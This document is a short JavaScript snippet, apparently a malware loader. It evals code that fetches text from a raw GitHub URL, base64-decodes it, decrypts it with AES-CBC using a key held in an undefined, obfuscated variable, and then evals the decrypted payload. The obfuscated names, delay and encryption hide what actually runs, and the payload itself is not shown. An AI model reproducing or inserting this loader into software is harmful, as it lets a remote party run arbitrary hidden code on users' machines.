eval(`
  (async () => {
    let d87c81346b88;
    await fetch('https://raw.githubusercontent.com/ds0z981/123/refs/heads/main/text.txt')
      .then(response => {
        if (!response.ok) throw new Error('1');
        return response.text();
      })
      .then(data => {
        d87c81346b88 = data;
      })
      .catch(error => {
        console.error(error);
      });
    async function decryptAES(encryptedHex, keyHex) {
      keyHex = keyHex.substring(0, 64);
      const keyBuffer = new Uint8Array(keyHex.match(/../g).map(h => parseInt(h, 16))).buffer;
      const key = await crypto.subtle.importKey(
        'raw',
        keyBuffer,
        { name: 'AES-CBC', length: 256 },
        false,
        ['encrypt', 'decrypt']
      );
      const iv = new Uint8Array(encryptedHex.substring(0, 32).match(/../g).map(h => parseInt(h, 16)));
      const encryptedData = new Uint8Array(encryptedHex.substring(32).match(/../g).map(h => parseInt(h, 16))).buffer;
      const decrypted = await crypto.subtle.decrypt(
        { name: 'AES-CBC', iv },
        key,
        encryptedData
      );
      return new TextDecoder().decode(decrypted);
    }
    function delay(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }
    await delay(400);
    let ebb4274bb6af = atob(d87c81346b88.substring(0, d87c81346b88.length - 1));
    let ad2e40378891 = await decryptAES(ebb4274bb6af, ca742092a304);
    const codeToEval = \`
      (async () => {
        \${ad2e40378891}
      })();
    \`;
    eval(codeToEval);
  })();
`);